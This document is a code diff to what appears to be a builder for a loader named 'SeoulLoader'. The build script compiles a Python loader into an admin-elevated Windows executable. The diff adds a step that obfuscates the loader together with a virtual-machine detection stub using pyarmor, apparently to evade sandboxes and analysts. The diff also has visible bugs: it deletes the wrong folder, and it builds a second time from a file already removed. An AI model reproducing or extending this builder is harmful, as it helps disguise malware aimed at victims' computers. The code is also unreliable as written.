@@ -42,6 +42,11 @@ def main():
 
         if not os.path.exists('dist'):
             os.mkdir('dist')
+    
+        if obsfucate == True:
+            os.mkdir('temp-stub')
+        else:
+            pass
 
         with open('dist/built_loader.py', 'w') as out:
             out.write(content)
@@ -52,7 +57,26 @@ def main():
 
         if admin_choice == 'y':
             print(Fore.BLUE + '[*] Building Executable with admin...' + Style.RESET_ALL)
-            print(Fore.YELLOW + '[*] Requesting admin privileges...' + Style.RESET_ALL)
+
+            if obsfucate == True:
+                import shutil
+                print(Fore.BLUE + '[*] Obsfucating...' + Style.RESET_ALL)
+                print(Fore.GREEN + '[+] Copying files to temp-stub...' + Style.RESET_ALL)
+                shutil.copy('dist/built_loader.py', 'temp-stub/built_loader.py')
+                shutil.copy('stub/vmdetect.py', 'temp-stub/vmdetect.py')
+                print(Fore.BLUE + '[*] Checking if pyarmor can be obfsucate...' + Style.RESET_ALL)
+                os.system('pyarmor-7 check -r temp-stub/')
+                print(Fore.BLUE + '[*] Obsfucating with pyarmor...' + Style.RESET_ALL)
+                os.system('pyarmor gen -r temp-stub/')
+
+                print(Fore.GREEN + '[+] Now Building...' + Style.RESET_ALL)
+                os.system(f'pyinstaller --onefile --uac-admin temp-stub/built_loader.py --distpath dist --name SeoulLoader')
+                print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
+                shutil.rmtree('dist/temp-stub')
+                os.remove('dist/built_loader.py')
+            else:
+                pass
+
             os.system(f'pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name SeoulLoader')
             print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
             os.remove('dist/built_loader.py')
